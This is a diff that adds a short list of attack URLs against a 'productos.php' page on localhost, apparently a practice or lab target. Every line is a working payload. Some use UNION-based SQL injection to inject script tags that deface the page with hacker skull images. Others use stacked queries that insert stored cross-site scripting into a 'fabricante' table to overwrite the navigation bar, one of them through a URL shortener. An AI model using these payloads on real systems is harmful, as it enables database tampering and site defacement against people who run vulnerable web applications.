@@ -1,0 +1,13 @@
+http://localhost:3000/productos.php?id=-1 union select 1,'<script><img src=https://static.vecteezy.com/system/resources/previews/014/213/866/large_2x/illustration-of-green-skull-hacker-theme-illustration-vector.jpg></script>',3,4 --
+http://localhost:3000/productos.php?id=-1 union select 1,'<script>const table = document.querySelector('table');const image = document.createElement('img');image.src = 'https://static.vecteezy.com/system/resources/previews/014/213/866/large_2x/illustration-of-green-skull-hacker-theme-illustration-vector.jpg';table.before(image);</script>',3,4 --
+http://localhost:3000/productos.php?id=-1 union select 1,'<script>
+    const image = document.querySelector('img[src*="https://static.vecteezy.com/system/resources/previews/014/213/866/large_2x/illustration-of-green-skull-hacker-theme-illustration-vector.jpg"]');
+    const header = document.querySelector('header');
+    if (image && header) {
+        header.prepend(image);
+    }
+</script>',3,4 --
+
+http://localhost:3000/productos.php?id=-1 union select 1,'<img src=https://static.vecteezy.com/system/resources/previews/014/213/866/large_2x/illustration-of-green-skull-hacker-theme-illustration-vector.jpg><script>const image = document.querySelector('img');</script>',3,4 --
+http://localhost:3000/productos.php?id=-1; INSERT INTO fabricante (nombre) VALUES ('<script>document.querySelector("nav").innerHTML=`<img src="https://elm.umaryland.edu/elm-stories/2023/Hacked.jpg">`</script>')--
+http://localhost:3000/productos.php?id=-1; INSERT INTO fabricante (nombre) VALUES ('<script>document.querySelector("nav").innerHTML=`<img src="https://n9.cl/15x1u5">`</script>')--
